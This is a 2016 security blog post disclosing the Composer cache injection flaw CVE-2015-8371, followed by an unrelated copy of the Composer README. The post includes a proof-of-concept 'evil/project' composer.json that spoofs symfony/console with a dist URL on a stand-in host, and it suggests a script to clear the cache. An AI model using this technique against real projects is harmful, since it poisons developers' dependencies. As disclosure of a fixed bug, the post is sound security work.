## Composer Cache Injection vulnerability - CVE-2015-8371

February 14, 2016
by [Flyingmana](https://plus.google.com/113709203377447920740?rel=author)
‚Äî
[Magento](https://flyingmana.de/blog_en/tag/magento.html), [php](https://flyingmana.de/blog_en/tag/php.html), [security](https://flyingmana.de/blog_en/tag/security.html)

End of last year I analyzed composer for a few attack vectors, which make use of Packagist to target Projects with own Repositories.

* [wordpress](http://wpackagist.org/)
* [zend](https://packages.zendframework.com/)
* [magento](https://www.magentocommerce.com/magento-connect/) (they support composer for magento 2 modules)
* [drupal](https://packagist.drupal-composer.org/)

Surprisingly I found one Vector, which still produces a danger, even if you [disable](https://getcomposer.org/doc/05-repositories.md#disabling-packagist)
the default packagist repository for your project.

The Vulnerability was fixed on 10.02.2016 in the source of composer.

The source of the problem lies in the way composer cached dist packages.
The Cache Key was generated from the name of the package, the dist type,
and a ‚Äúmagical‚Äù reference, which got provided from the package repository
(packagist uses the commit hash here) and is easy to fake.

There are two easy ways to make use of this.

The first one is directly via packagist, to add the package you want to use
for the attack, and which before only exists on the project specific
repository yet. And as cached packages have a ttl of 30 days, they will even
after removing them from the repository stay inside the cache for a while.

The second one is more interesting as it is easy to get people to install
a new hip composer project. I talk about the composer package type ‚Äúproject‚Äù,
as it allows some additional stuff, like usage of own repositories,
or even to directly define dist packages. So you can even replace packages,
existing on packagist.

A likely target then would be the symfony/console package,
which is used by a lot of projects.

The evil thing about this attack is, it would even work when you
disable plugins and scripts for this run.
And making use of this options should normally remove every potential security threat.

Btw. you should always disable both for new projects and packages you want to
try out or only looking at.

How would such an evil project look:

```
{
  "name": "evil/project",
  "type": "project",
  "version": "2.0.0",
    "repositories": [
        {
            "type": "package",
            "package": {
                "name": "symfony/console",
                "version": "v2.7.6",
                "dist": {
                    "url": "http://127.0.0.5:7070/5efd632294c8320ea52492db22292ff853a43766.zip",
                    "reference": "5efd632294c8320ea52492db22292ff853a43766",
                    "type": "zip"
                }
            }
        }
    ],
    "require": {
        "symfony/console": "v2.7.6"
    }
}

```

For extra evil you can add a `post-root-package-install` script to clean
the cache, as not everyone disables scripts.

Anyway, the attack would only work when the package is not already cached,
but having success in only one of 31 cases should be enough
for a package which has 40k daily installs. And one success allows for
more evil stuff to spread maleware into the developers ecosystem. Just imagine
a global git hook, which modifies pushes to github into non PR branches.

# Dependency Management for PHP

Composer helps you declare, manage, and install dependencies of PHP projects.

See <https://getcomposer.org/> for more information and documentation.

[![Continuous Integration](https://github.com/composer/composer/workflows/Continuous%20Integration/badge.svg?branch=main)](https://github.com/composer/composer/actions)

## Installation / Usage

Download and install Composer by following the [official instructions](https://getcomposer.org/download/).

For usage, see [the documentation](https://getcomposer.org/doc/).

## Packages

Find public packages on [Packagist.org](https://packagist.org).

For private package hosting take a look at [Private Packagist](https://packagist.com).

## Community

Follow [@packagist](https://twitter.com/packagist) or [@seldaek](https://twitter.com/seldaek) on Twitter for announcements, or check the [#composerphp](https://twitter.com/search?q=%23composerphp&src=typed_query&f=live) hashtag.

For support, Stack Overflow offers a good collection of
[Composer related questions](https://stackoverflow.com/questions/tagged/composer-php), or you can use the [GitHub discussions](https://github.com/composer/composer/discussions).

Please note that this project is released with a
[Contributor Code of Conduct](https://www.contributor-covenant.org/version/1/4/code-of-conduct/).
By participating in this project and its community you agree to abide by those terms.

## Requirements

#### Latest Composer

PHP 7.2.5 or above for the latest version.

#### Composer 2.2 LTS (Long Term Support)

PHP versions 5.3.2 - 8.1 are still supported via the LTS releases of Composer (2.2.x). If you
run the installer or the `self-update` command the appropriate Composer version for your PHP
should be automatically selected.

#### Binary dependencies

* `7z` (or `7zz`)
* `unzip` (if `7z` is missing)
* `gzip`
* `tar`
* `unrar`
* `xz`
* Git (`git`)
* Mercurial (`hg`)
* Fossil (`fossil`)
* Perforce (`p4`)
* Subversion (`svn`)

It's important to note that the need for these binary dependencies may vary
depending on individual use cases. However, for most users, only 2 dependencies
are essential for Composer: `7z` (or `7zz` or `unzip`), and `git`.
